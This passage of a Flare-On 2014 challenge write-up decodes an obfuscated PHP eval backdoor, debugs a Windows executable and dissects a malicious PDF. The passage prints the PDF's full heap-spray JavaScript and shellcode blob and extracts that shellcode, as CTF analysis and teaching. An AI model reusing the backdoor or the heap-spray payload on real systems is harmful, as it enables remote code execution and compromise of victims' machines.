40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47]
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; data = &#34;&#34;
&amp;gt;&amp;gt;&amp;gt; for i in order:
...   data += terms[i]
...
&amp;gt;&amp;gt;&amp;gt; print data
$_= &#39;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9&#39;;$__=&#39;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&#39;;$___=&#34;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&#34;;eval($___($__));
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let&amp;#8217;s do the &lt;code&gt;eval&lt;/code&gt; manually. The &lt;code&gt;$__&lt;/code&gt; variable is referenced first and it looks like to be base64 encoded. Let&amp;#8217;s decode it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ echo -en &#34;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&#34; | base64 -d -
$code=base64_decode($_);eval($code);
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, this code will base64 decode the &lt;code&gt;$_&lt;/code&gt; variable and that&amp;#8217;s what we need to do next:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ echo -en &#34;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9&#34; | base64 -d -
if(isset($_POST[&#34;\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D&#34;])) {
 eval(base64_decode($_POST[&#34;\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D&#34;]));
}
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the decoding results in more PHP code that will &lt;code&gt;eval&lt;/code&gt; the base64 decoded version of string: &lt;code&gt;\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D&lt;/code&gt;. This string is weird as it contains hex, octal and seemingly octal bytes. Look carefully at the bytes: &lt;code&gt;\97\49\x31\68&lt;/code&gt;. Although preceded by a backslash &lt;code&gt;97&lt;/code&gt;, &lt;code&gt;49&lt;/code&gt; and &lt;code&gt;68&lt;/code&gt; are not octal bytes. It seems like another layer of obfuscation where decimal bytes are preceded with slashes to confuse the parser. Thanks to &lt;a href=&#34;http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html&#34;&gt;this&lt;/a&gt; writeup from &lt;a href=&#34;https://twitter.com/bbaskin&#34;&gt;@bbaskin&lt;/a&gt; we can easily decode this encoded blob and get the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ipython
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; c = r&#34;\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D&#34;
&amp;gt;&amp;gt;&amp;gt; result = &#34;&#34;
&amp;gt;&amp;gt;&amp;gt; for item in c.split(&#34;\\&#34;):
...   if item and item != &#34;&#34;:
...     if item[0] == &#34;x&#34;:
...       result += chr(int(item[1:3], 16))
...     else:
...       result += chr(int(item))
...
&amp;gt;&amp;gt;&amp;gt; print result
a11DOTthatDOTjava5crapATflareDASHonDOTcom
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; print result.replace(&#34;DOT&#34;, &#34;.&#34;).replace(&#34;DASH&#34;, &#34;-&#34;).replace(&#34;AT&#34;, &#34;@&#34;)
a11.that.java5crap@flare-on.com
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3&gt;Challenge #3&lt;/h3&gt;

&lt;p&gt;This challenge comprised of a binary file aptly named &lt;code&gt;such_evil.exe&lt;/code&gt;. Let&amp;#8217;s do the initial information gathering on this file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ file such_evil
such_evil: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
$
$ strings such_evil
!This program cannot be run in DOS mode.
.text
`.data
%(0@
%,0@
%00@
%40@
%80@
%&amp;lt;0@
%@0@
msvcrt.dll
_controlfp
__set_app_type
__getmainargs
exit
_XcptFilter
_exit
_except_handler3
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;#8217;s an extremely small number of strings but nothing out of the ordinary. I used &lt;a href=&#34;https://www.winitor.com/&#34;&gt;pestudio&lt;/a&gt; at this point but there wasn&amp;#8217;t much to infer. Eventually I decided to debug the file with &lt;a href=&#34;http://www.ollydbg.de/&#34;&gt;Ollydbg&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;/static/files/flareon2014-c3-1.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I stepped through the code, carefully avoiding the &lt;code&gt;msvcrt&lt;/code&gt; code and placing breakpoints at &lt;code&gt;CALL&lt;/code&gt; instructions. That is when I stumbled across one such instruction: &lt;code&gt;CALL 00401000&lt;/code&gt;. When I stepped over this call, the program terminated with a popup showing &lt;code&gt;BrokenByte&lt;/code&gt; message:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;/static/files/flareon2014-c3-2.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;I decided to enter this code and restarted the process. Upon entering it I found a lot of code performing stack operations. I skipped through these instructions till the point where a &lt;code&gt;CALL EAX&lt;/code&gt; instruction was placed immediately after the stack operations. Upon entering this call, I found instructions that seemed like part of a decoding routine:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;/static/files/flareon2014-c3-3.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;However, it turned out to be just another excessively long routine doing useless stuff, decoding strings like &lt;code&gt;nopasaurus&lt;/code&gt;, &lt;code&gt;and i&#39;m spent&lt;/code&gt;, etc. I decided to keep a tab on these string locations. A few instructions later the &lt;code&gt;BrokenByte&lt;/code&gt; string was pushed to stack hence indicating termination of program. At this point it was evident that the program won&amp;#8217;t display flag as a popup message but instead decode and keep it in memory. Looking around the memory locations where strings were being decoded, I found an email like string:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;/static/files/flareon2014-c3-3.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;

&lt;p&gt;So the flag for this challenge turned out to be: &lt;code&gt;such.5h311010101.flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;h3&gt;Challenge #4&lt;/h3&gt;

&lt;p&gt;This is a PDF challenge and I started with my usual information gathering steps:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ file APT9001.pdf
APT9001.pdf: PDF document, version 1.5
$
$ pdfinfo APT9001.pdf
Tagged:         no
Form:           none
Pages:          2
Encrypted:      no
Page size:      612 x 792 pts (letter)
Page rot:       0
File size:      21284 bytes
Optimized:      no
PDF version:    1.5
$
$ pdfid.py APT9001.pdf
PDFiD 0.2.1 APT9001.pdf
 PDF Header: %PDF-1.5
 obj                   10
 endobj                 9
 stream                 3
 endstream              3
 xref                   2
 trailer                2
 startxref              2
 /Page                  3(2)
 /Encrypt               0
 /ObjStm                0
 /JS                    1(1)
 /JavaScript            1(1)
 /AA                    0
 /OpenAction            1(1)
 /AcroForm              0
 /JBIG2Decode           1(1)
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /XFA                   0
 /Colors &amp;gt; 2^24         0
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we have a PDF file of 21KB with two pages and no optimizations. It has an object with &lt;code&gt;Javascript&lt;/code&gt;, &lt;code&gt;OpenAction&lt;/code&gt; and &lt;code&gt;JBIB2DECODE&lt;/code&gt; filters. I decided to open this file and look at its pages. The first page shows title from the &lt;a href=&#34;http://intelreport.mandiant.com/Mandiant_APT1_Report.pdf&#34;&gt;Mandiant APT1&lt;/a&gt; report and the other page is left blank. I tried analyzing its objects and streams using &lt;a href=&#34;http://eternal-todo.com/tools/peepdf-pdf-analysis-tool&#34;&gt;peepdf&lt;/a&gt; but it crashed. However Didier Stevens &lt;a href=&#34;http://blog.didierstevens.com/programs/pdf-tools/&#34;&gt;pdf-parser.py&lt;/a&gt; script was able to decode it correctly:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ pdf-parser.py APT9001.pdf
PDF Comment &#39;%PDF-1.5\r\n&#39;
PDF Comment &#39;%\xea\xbb\xc1\x9c\r\n&#39;
obj 1 0
 Type: /Catalog
 Referencing: 2 0 R, 3 0 R, 5 0 R
  &amp;lt;&amp;lt;
    /Type /Catalog
    /Outlines 2 0 R
    /Pages 3 0 R
    /OpenAction 5 0 R
  &amp;gt;&amp;gt;
obj 2 0
 Type: /Outlines
 Referencing:
  &amp;lt;&amp;lt;
    /Type /Outlines
    /Count 0
  &amp;gt;&amp;gt;
obj 3 0
 Type: /Pages
 Referencing: 4 0 R, 7 0 R
  &amp;lt;&amp;lt;
    /Type /Pages
    /Kids &#39;[  4 0 R \r\n7 0 R   \r\n]&#39;
    /Count 2
  &amp;gt;&amp;gt;
obj 4 0
 Type: /Page
 Referencing: 3 0 R
  &amp;lt;&amp;lt;
    /Type /Page
    /Parent 3 0 R
    /MediaBox &#39;[0  0 \r\n 612   \r\n 792   \r\n ]&#39;
  &amp;gt;&amp;gt;
obj 5 0
 Type: /Action
 Referencing: 6 0 R
  &amp;lt;&amp;lt;
    /Type /Action
    /S /JavaScript
    /JS 6 0 R
  &amp;gt;&amp;gt;
obj 6 0
 Type:
 Referencing:
 Contains stream
  &amp;lt;&amp;lt;
    /Length 6170
    /Filter &#39;[  \r\n /Fla#74eDe#63o#64#65  /AS#43IIHexD#65cod#65 ]&#39;
  &amp;gt;&amp;gt;
obj 7 0
 Type: /Page
 Referencing: 3 0 R, 8 0 R
 Contains stream
  &amp;lt;&amp;lt;
    /Type /Page
    /Parent 3 0 R
    /Contents [ 8 0 R ]
  &amp;gt;&amp;gt;
xref
trailer
  &amp;lt;&amp;lt;
    /Size 9
    /Root 10R
  &amp;gt;&amp;gt;
startxref 7169
obj 4 0
 Type: /Page
 Referencing: 3 0 R, 9 0 R
  &amp;lt;&amp;lt;
    /Type /Page
    /Parent 3 0 R
    /MediaBox [ 0 0 612 792 ]
    /Resources
    /CropBox [ 0 0 612 792 ]
    /Rotate 0
    /Contents [ 9 0 R ]
  &amp;gt;&amp;gt;
obj 9 0
 Type:
 Referencing:
 Contains stream
  &amp;lt;&amp;lt;
    /Length 13514
    /Filter [ /FlateDecode ]
  &amp;gt;&amp;gt;
xref
trailer
  &amp;lt;&amp;lt;
    /Size 10
    /Root 10R
    /Prev 7169
  &amp;gt;&amp;gt;
startxref 21163
PDF Comment &#39;%%EOF\n&#39;
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Of all objects, #6 seemed interesting as the &lt;code&gt;FlateDecode&lt;/code&gt; and &lt;code&gt;ASCIIHexDecode&lt;/code&gt; encoded javascript inside it was referenced by #5. Let&amp;#8217;s extract and analyze this javascript code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ pdf-parser.py APT9001.pdf -f -o6
obj 6 0
 Type:
 Referencing:
 Contains stream
  &amp;lt;&amp;lt;
    /Length 6170
    /Filter &#39;[  \r\n /Fla#74eDe#63o#64#65  /AS#43IIHexD#65cod#65 ]&#39;
  &amp;gt;&amp;gt;
 &#39;\n    var HdPN = &#34;&#34;;\n    var zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf = &#34;&#34;;
 \n    var IxTUQnOvHg = unescape(&#34;%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21bf%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u769b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u8814%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u2577%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u41b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u3174%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u027c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua316%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u98a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81ff%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff&#34;);
 \n    var MPBPtdcBjTlpvyTYkSwgkrWhXL = &#34;&#34;;
 \n\n    for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=128;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&amp;gt;=0;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) MPBPtdcBjTlpvyTYkSwgkrWhXL += unescape(&#34;%ub32f%u3791&#34;);\n    ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv = MPBPtdcBjTlpvyTYkSwgkrWhXL + IxTUQnOvHg;
 \n    OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY = unescape(&#34;%ub32f%u3791&#34;);
 \n    fJWhwERSDZtaZXlhcREfhZjCCVqFAPS = 20;
 \n    fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA = fJWhwERSDZtaZXlhcREfhZjCCVqFAPS+ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv.length\n    while (OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length&amp;lt;fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA) OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY+=OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY;
 \n    UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
 \n    MOysyGgYplwyZzNdETHwkru = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length-fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
 \n    while(MOysyGgYplwyZzNdETHwkru.length+fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA &amp;lt; 0x40000) MOysyGgYplwyZzNdETHwkru = MOysyGgYplwyZzNdETHwkru+MOysyGgYplwyZzNdETHwkru+UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb;
 \n    DPwxazRhwbQGu = new Array();
 \n    for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&amp;lt;100;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) DPwxazRhwbQGu[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = MOysyGgYplwyZzNdETHwkru + ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv;
 \n\n    for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=142;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&amp;gt;=0;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += unescape(&#34;%ub550%u0166&#34;);
 \n    bGtvKT = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length + 20\n    while (zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length &amp;lt; bGtvKT) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
 \n    Juphd = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, bGtvKT);
 \n    QCZabMzxQiD = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length-bGtvKT);
 \n    while(QCZabMzxQiD.length+bGtvKT &amp;lt; 0x40000) QCZabMzxQiD = QCZabMzxQiD+QCZabMzxQiD+Juphd;
 \n    FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE = new Array();
 \n    for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA&amp;lt;125;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = QCZabMzxQiD + zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;\n&#39;
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We see unicode blob passed as an argument to &lt;code&gt;unescape&lt;/code&gt; method. Let&amp;#8217;s extract and analyze it. Once extracted we will need to clean and convert it to hex:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ipython
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; import re
&amp;gt;&amp;gt;&amp;gt; import binascii
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; sc = &#34;%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21bf%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u769b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u8814%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u2577%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u41b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u3174%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u027c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua316%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u98a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81ff%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff&#34;
&amp;gt;&amp;gt;&amp;gt;
&amp;gt;&amp;gt;&amp;gt; with open(&#34;shellcode.binary&#34;, &#34;wb&#34;) as fo:
...   fo.write(binascii.unhexlify(re.sub(r&#34;%u(..)(..)&#34;, r&#34;\2\1&#34;, sc)))
...
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The extracted binary shellcode blob contains references to Windows APIs and some strings:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ cat shellcode.binary | hd
00000000  f9 72 49 46 25 15 0d 7f  3c 3d 84 e0 2a d6 39 e1  |.rIF%...&amp;lt;=..*.9.|
